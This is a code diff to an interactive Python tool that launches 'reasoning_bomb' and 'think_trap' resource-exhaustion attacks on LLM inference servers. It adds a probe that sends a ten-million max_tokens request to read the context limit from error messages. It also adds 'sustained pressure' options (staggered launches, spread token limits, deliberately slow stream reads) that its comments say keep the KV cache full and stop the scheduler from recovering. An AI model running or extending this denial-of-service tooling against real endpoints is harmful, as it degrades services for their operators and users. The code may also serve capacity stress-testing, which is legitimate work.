@@ -92,6 +92,18 @@ def _ask_int(prompt: str, default: int, min_val: int = 1) -> int:
             _print("    Please enter an integer.", "yellow")
 
 
+def _ask_float(prompt: str, default: float, min_val: float = 0.0) -> float:
+    while True:
+        raw = _ask(prompt, str(default))
+        try:
+            v = float(raw)
+            if v >= min_val:
+                return v
+            _print(f"    Value must be >= {min_val}.", "yellow")
+        except ValueError:
+            _print("    Please enter a number.", "yellow")
+
+
 
 def _choose(prompt: str, options: list[str], default: str) -> str:
     opts_str = " / ".join(
@@ -157,24 +169,57 @@ def _classify_error(error: str) -> Optional[str]:
 
 async def try_fetch_context_length(target: TargetConfig) -> Optional[int]:
     """
-    Try to discover the model's context window from the API.
-    Queries /v1/models/{model} for OpenAI-compatible endpoints.
-    Returns the context_window int, or None if unavailable.
+    Detect the model's max context length by sending a request with a huge
+    max_tokens value and parsing the limit out of the error message.
+    Prints what the server responds so the user can see what's happening.
     """
-    url = f"{target.base_url.rstrip('/')}/v1/models/{target.model}"
-    headers = {"Content-Type": "application/json", **target.auth_headers}
+    import re
+
+    _PATTERNS = [
+        r"max_total_tokens=(\d+)",                     # vLLM: max_model_len=max_total_tokens=N
+        r"maximum context length is (\d+)",            # OpenAI style
+        r"max_model_len \((\d+)\)",                    # vLLM style (parens)
+        r"max_model_len=(\d+)",                        # vLLM style (equals)
+        r"context_window.*?(\d{4,})",
+        r"context.{0,20}length.{0,30}?(\d{4,})",
+        r"maximum.{0,30}?(\d{4,})\s*tokens",
+        r"(\d{4,})\s*tokens?.{0,20}(is|are) the max",
+    ]
+
+    endpoint = target.endpoint
+    payload: dict = {
+        "model":      target.model,
+        "messages":   [{"role": "user", "content": "hi"}],
+        "max_tokens": 10_000_000,
+        "stream":     False,
+    }
+
     try:
         timeout = aiohttp.ClientTimeout(total=8.0)
         async with aiohttp.ClientSession(timeout=timeout) as session:
-            async with session.get(url, headers=headers, ssl=target.verify_ssl) as resp:
-                if resp.status == 200:
-                    data = await resp.json()
-                    # vLLM and some OpenAI-compat APIs expose max_model_len
-                    for key in ("max_model_len", "context_window", "context_length"):
-                        if key in data:
-                            return int(data[key])
-    except Exception:
-        pass
+            async with session.post(
+                endpoint,
+                json=payload,
+                headers={"Content-Type": "application/json", **target.auth_headers},
+                ssl=target.verify_ssl,
+            ) as resp:
+                body = await resp.text()
+                for pattern in _PATTERNS:
+                    m = re.search(pattern, body, re.IGNORECASE)
+                    if m:
+                        return int(m.group(1))
+                _print(
+                    "  [yellow]No context length found in error body — enter manually.[/yellow]"
+                    if _RICH else
+                    "  No context length found in error body — enter manually."
+                )
+    except Exception as exc:
+        _print(
+            f"  [yellow]Probe request failed: {exc}[/yellow]"
+            if _RICH else
+            f"  Probe request failed: {exc}"
+        )
+
     return None
 
 
@@ -237,6 +282,46 @@ def gather_target_config() -> TargetConfig:
     )
 
 
+def _estimate_prompt_tokens(attack_type: str, extra: dict) -> int:
+    """
+    Rough token estimate for the attack prompt by loading the prompt file and
+    measuring character count / 4 (a common chars-per-token approximation).
+    Returns 0 if the file can't be loaded or parsed.
+    """
+    import json as _json
+    try:
+        if attack_type == "reasoning_bomb":
+            path = extra.get("puzzle_file", "")
+            tier = extra.get("budget_tier", "256")
+            if not path:
+                return 0
+            with open(path, "r", encoding="utf-8") as fh:
+                data = _json.load(fh)
+            # Unwrap common wrapper keys
+            for key in ("puzzles", "data", "samples", "dataset", "problems"):
+                if key in data and isinstance(data[key], dict):
+                    data = data[key]
+                    break
+            puzzles = data.get(tier, data.get(str(tier), []))
+            if puzzles:
+                sample = puzzles[0] if isinstance(puzzles[0], str) else str(puzzles[0])
+                return max(len(sample) // 4, 1)
+
+        elif attack_type == "think_trap":
+            path = extra.get("prompts_file", "")
+            if not path:
+                return 0
+            with open(path, "r", encoding="utf-8") as fh:
+                data = _json.load(fh)
+            prompts = data.get("prompts", [])
+            if prompts:
+                text = prompts[0].get("text", "")
+                return max(len(text) // 4, 1)
+    except Exception:
+        pass
+    return 0
+
+
 def gather_attack_params(target: TargetConfig) -> dict:
     _print("\n[bold cyan]── Attack Configuration ──[/bold cyan]" if _RICH else "\n── Attack Configuration ──")
 
@@ -258,24 +343,6 @@ def gather_attack_params(target: TargetConfig) -> dict:
         except ValueError:
             pass
 
-    # max_tokens per request
-    _print("  [dim]Trying to auto-detect context length from API…[/dim]" if _RICH
-           else "  Trying to auto-detect context length from API…")
-    detected = asyncio.run(_fetch_context_length_safe(target))
-    if detected:
-        _print(f"  [green]Detected context window: {detected:,} tokens[/green]" if _RICH
-               else f"  Detected context window: {detected:,} tokens")
-        default_max = min(detected, 32768)
-    else:
-        _print("  [yellow]Could not detect context length from API.[/yellow]" if _RICH
-               else "  Could not detect context length from API.")
-        default_max = 16384
-
-    max_tokens = _ask_int(
-        "Max tokens per request (max_completion_tokens)",
-        default=default_max,
-    )
-
     extra: dict[str, Any] = {}
 
     if attack_type == "reasoning_bomb":
@@ -288,12 +355,99 @@ def gather_attack_params(target: TargetConfig) -> dict:
         prompts_file = _ask("Path to ThinkTrap prompts JSON file", "prompts/thinktrap_prompts.json")
         extra["prompts_file"] = prompts_file
 
+    # ── Determine prompt token cost, then probe for context limit ────────────
+    if attack_type == "reasoning_bomb":
+        estimated_prompt_tokens = int(extra.get("budget_tier", 0))
+    else:
+        estimated_prompt_tokens = _estimate_prompt_tokens(attack_type, extra)
+
+    _print("  [dim]Probing server to detect max context length…[/dim]" if _RICH
+           else "  Probing server to detect max context length…")
+    detected = asyncio.run(_fetch_context_length_safe(target))
+    if detected:
+        usable = max(detected - estimated_prompt_tokens - 64, 1024)
+        if estimated_prompt_tokens > 0:
+            _print(
+                f"  [green]Detected context length: {detected:,} tokens  "
+                f"(prompt ≈ {estimated_prompt_tokens:,} tokens → "
+                f"max_completion_tokens default: {usable:,})[/green]"
+                if _RICH else
+                f"  Detected context length: {detected:,} tokens  "
+                f"(prompt ≈ {estimated_prompt_tokens:,} tokens → "
+                f"max_completion_tokens default: {usable:,})"
+            )
+        else:
+            _print(
+                f"  [green]Detected max context length: {detected:,} tokens.[/green]"
+                if _RICH else
+                f"  Detected max context length: {detected:,} tokens."
+            )
+            usable = detected
+        default_max = usable
+    else:
+        _print(
+            "  [yellow]Could not detect context length — defaulting to 16384.[/yellow]"
+            if _RICH else
+            "  Could not detect context length — defaulting to 16384."
+        )
+        default_max = 16384
+
+    max_tokens = _ask_int(
+        "Max tokens per request (max_completion_tokens)",
+        default=default_max,
+    )
+
+    # ── Sustained pressure options ────────────────────────────────────────────
+    _print(
+        "\n[bold cyan]── Sustained Pressure Options ──[/bold cyan]\n"
+        "  These settings prevent simultaneous request completion (wave pattern)\n"
+        "  which would briefly free the KV cache and let the scheduler recover.\n"
+        if _RICH else
+        "\n── Sustained Pressure Options ──\n"
+        "  These settings prevent simultaneous request completion (wave pattern)\n"
+        "  which would briefly free the KV cache and let the scheduler recover.\n"
+    )
+
+    _print(
+        "  [dim]Launch stagger: delay between starting each instance so they\n"
+        "  complete at different times. Rule of thumb: set to est_request_duration / n_instances.[/dim]"
+        if _RICH else
+        "  Launch stagger: delay between starting each instance so they\n"
+        "  complete at different times. Rule of thumb: set to est_request_duration / n_instances."
+    )
+    launch_stagger_s = _ask_float("Launch stagger between instances (seconds, 0=off)", default=0.0)
+
+    _print(
+        "  [dim]Max-token spread: assign each instance a different max_tokens\n"
+        "  (linearly distributed across ±spread%). Prevents synchronised completions\n"
+        "  even after the initial stagger window has passed.[/dim]"
+        if _RICH else
+        "  Max-token spread: assign each instance a different max_tokens\n"
+        "  (linearly distributed across ±spread%). Prevents synchronised completions\n"
+        "  even after the initial stagger window has passed."
+    )
+    max_tokens_spread_pct = _ask_float("Max-token spread (%, 0=off, e.g. 25)", default=0.0, min_val=0.0)
+
+    _print(
+        "  [dim]Stream read delay: sleep between reading each streaming chunk.\n"
+        "  Backs up the server output queue, extending effective KV block\n"
+        "  occupancy beyond pure generation time. 0.005–0.02 s is a good range.[/dim]"
+        if _RICH else
+        "  Stream read delay: sleep between reading each streaming chunk.\n"
+        "  Backs up the server output queue, extending effective KV block\n"
+        "  occupancy beyond pure generation time. 0.005–0.02 s is a good range."
+    )
+    stream_read_delay_s = _ask_float("Stream read delay per chunk (seconds, 0=off)", default=0.0, min_val=0.0)
+
     return {
-        "attack_type":   attack_type,
-        "n_instances":   n_instances,
-        "token_budget":  token_budget,
-        "max_tokens":    max_tokens,
-        "extra":         extra,
+        "attack_type":          attack_type,
+        "n_instances":          n_instances,
+        "token_budget":         token_budget,
+        "max_tokens":           max_tokens,
+        "launch_stagger_s":     launch_stagger_s,
+        "max_tokens_spread_pct": max_tokens_spread_pct,
+        "stream_read_delay_s":  stream_read_delay_s,
+        "extra":                extra,
     }
 
 
@@ -315,13 +469,18 @@ def build_attack_factory(
     extra: dict,
     n_puzzles: Optional[int] = None,
     instance_index: int = 0,
+    stream_read_delay_s: float = 0.0,
 ) -> tuple[type[BaseAttack], Callable, dict]:
     """
     Returns (attack_cls, config_factory, extra_kwargs) for one instance.
     For reasoning_bomb, each instance gets a distinct puzzle index so
     concurrent requests don't share a prompt (avoids prefix-cache bypass).
     """
-    config_factory = make_config_factory(target, max_tokens=max_tokens)
+    config_factory = make_config_factory(
+        target,
+        max_tokens=max_tokens,
+        stream_read_delay_s=stream_read_delay_s,
+    )
 
     if attack_type == "reasoning_bomb":
         puzzle_file  = extra.get("puzzle_file", "prompts/reasoningBomb_puzzles.json")
@@ -463,19 +622,25 @@ class AttackOrchestrator:
 
     def __init__(
         self,
-        target:        TargetConfig,
-        attack_type:   str,
-        n_instances:   int,
-        max_tokens:    int,
-        token_budget:  Optional[int],
-        attack_extra:  dict,
+        target:               TargetConfig,
+        attack_type:          str,
+        n_instances:          int,
+        max_tokens:           int,
+        token_budget:         Optional[int],
+        attack_extra:         dict,
+        launch_stagger_s:     float = 0.0,
+        max_tokens_spread_pct: float = 0.0,
+        stream_read_delay_s:  float = 0.0,
     ) -> None:
-        self.target       = target
-        self.attack_type  = attack_type
-        self.n_instances  = n_instances
-        self.max_tokens   = max_tokens
-        self.token_budget = token_budget
-        self.attack_extra = attack_extra
+        self.target               = target
+        self.attack_type          = attack_type
+        self.n_instances          = n_instances
+        self.max_tokens           = max_tokens
+        self.token_budget         = token_budget
+        self.attack_extra         = attack_extra
+        self.launch_stagger_s     = launch_stagger_s
+        self.max_tokens_spread_pct = max_tokens_spread_pct
+        self.stream_read_delay_s  = stream_read_delay_s
 
         self._stop   = asyncio.Event()
         self._queue:  asyncio.Queue = asyncio.Queue()
@@ -533,18 +698,32 @@ class AttackOrchestrator:
     # ── Instance factory ──────────────────────────────────────────────
 
     def _make_instance(self, index: int) -> AttackerInstance:
+        # ── Per-instance max_tokens spread ────────────────────────────────────
+        # Distribute max_tokens linearly across instances so each one hits its
+        # limit at a different wall-clock time, avoiding synchronised KV-cache
+        # frees.  With spread=25% and 4 instances the range is [75%, 100%] of
+        # max_tokens: [0.75M, 0.83M, 0.92M, 1.00M].
+        if self.max_tokens_spread_pct > 0 and self.n_instances > 1:
+            low   = self.max_tokens * (1.0 - self.max_tokens_spread_pct / 100.0)
+            step  = (self.max_tokens - low) / (self.n_instances - 1)
+            inst_max_tokens = max(64, int(round(low + step * index)))
+        else:
+            inst_max_tokens = self.max_tokens
+
         cls, factory, extra_kw = build_attack_factory(
             self.attack_type,
             self.target,
-            self.max_tokens,
+            inst_max_tokens,
             self.attack_extra,
             n_puzzles=self._pool_size,
             instance_index=index,
+            stream_read_delay_s=self.stream_read_delay_s,
         )
         cfg = AttackerInstanceConfig(
             attack_cls=cls,
             attack_config_factory=factory,
             attack_extra_kwargs=extra_kw,
+            launch_delay_s=self.launch_stagger_s * index,
         )
         return AttackerInstance(cfg)
 
@@ -976,21 +1155,30 @@ class AttackOrchestrator:
             f'"{self.target.system_prompt[:60]}{"…" if len(self.target.system_prompt) > 60 else ""}"'
             if self.target.system_prompt else "none"
         )
+        stagger_str    = f"{self.launch_stagger_s:.2f}s" if self.launch_stagger_s > 0 else "off"
+        spread_str     = f"±{self.max_tokens_spread_pct:.0f}%" if self.max_tokens_spread_pct > 0 else "off"
+        read_delay_str = f"{self.stream_read_delay_s*1000:.0f} ms/chunk" if self.stream_read_delay_s > 0 else "off"
         _print(
             f"\n[bold cyan]── Launching Attack ──[/bold cyan]\n"
-            f"  Type         : {self.attack_type}\n"
-            f"  Instances    : {self.n_instances}\n"
-            f"  Max tokens   : {self.max_tokens:,} per request\n"
-            f"  Budget       : {f'{self.token_budget:,}' if self.token_budget else 'unlimited'}\n"
-            f"  System prompt: {sp_display}\n"
+            f"  Type            : {self.attack_type}\n"
+            f"  Instances       : {self.n_instances}\n"
+            f"  Max tokens      : {self.max_tokens:,} per request\n"
+            f"  Token spread    : {spread_str}\n"
+            f"  Launch stagger  : {stagger_str}\n"
+            f"  Stream rd delay : {read_delay_str}\n"
+            f"  Budget          : {f'{self.token_budget:,}' if self.token_budget else 'unlimited'}\n"
+            f"  System prompt   : {sp_display}\n"
             f"  Press [bold]Ctrl+C[/bold] to stop.\n"
             if _RICH else
             f"\n── Launching Attack ──\n"
-            f"  Type         : {self.attack_type}\n"
-            f"  Instances    : {self.n_instances}\n"
-            f"  Max tokens   : {self.max_tokens:,} per request\n"
-            f"  Budget       : {f'{self.token_budget:,}' if self.token_budget else 'unlimited'}\n"
-            f"  System prompt: {sp_display}\n"
+            f"  Type            : {self.attack_type}\n"
+            f"  Instances       : {self.n_instances}\n"
+            f"  Max tokens      : {self.max_tokens:,} per request\n"
+            f"  Token spread    : {spread_str}\n"
+            f"  Launch stagger  : {stagger_str}\n"
+            f"  Stream rd delay : {read_delay_str}\n"
+            f"  Budget          : {f'{self.token_budget:,}' if self.token_budget else 'unlimited'}\n"
+            f"  System prompt   : {sp_display}\n"
             f"  Press Ctrl+C to stop.\n"
         )
 
@@ -1129,6 +1317,9 @@ def main() -> None:
         max_tokens=params["max_tokens"],
         token_budget=params["token_budget"],
         attack_extra=params["extra"],
+        launch_stagger_s=params["launch_stagger_s"],
+        max_tokens_spread_pct=params["max_tokens_spread_pct"],
+        stream_read_delay_s=params["stream_read_delay_s"],
     )
 
     try:
